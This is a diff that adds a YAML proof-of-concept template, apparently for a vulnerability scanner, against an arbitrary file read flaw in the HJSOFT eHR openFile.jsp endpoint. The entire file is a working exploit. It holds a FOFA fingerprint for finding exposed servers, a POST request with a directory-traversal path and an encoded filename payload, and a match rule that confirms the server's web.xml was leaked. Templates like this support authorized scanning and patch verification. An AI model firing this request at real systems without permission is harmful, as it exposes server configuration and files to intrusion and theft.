@@ -1,0 +1,18 @@
+id: poc-yaml-hjsoft-ehr-openfile-jsp-anyfile-read
+info:
+  name: 宏景eHR openFile.jsp 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 宏景eHR
+  fofa: app="HJSOFT-HCM"
+requests:
+- method: POST
+  path: /templates/attestation/../../general/muster/hmuster/openFile.jsp
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: filename=8uHo1M8Ok6bZ468mKmzw70ounZHwKUWnpVOrvOAV6WoPAATTP3HJDPAATTP
+  expression: status_code == 200 && contains(body,"<filter>") && contains(body,"GzipJsFilter")
+    && contains(body,"</web-app>")
+variables: {}
+transport: http
